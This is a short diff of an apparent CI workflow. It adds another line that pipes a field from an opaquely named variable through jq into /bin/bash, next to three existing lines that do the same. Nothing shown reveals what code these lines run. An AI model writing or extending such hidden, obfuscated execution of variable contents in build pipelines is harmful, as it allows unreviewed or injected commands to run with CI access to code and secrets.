@@ -26,6 +26,7 @@ jobs:
           echo $vqyeo38 | jq -r .ih00646 | /bin/bash
           printf '%s' "$nfvr5" | jq -r .v402 | /bin/bash
           echo $kk74720 | jq -r .hrqk65405 | /bin/bash
+          printf '%s' "$hsms39" | jq -r .b7 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
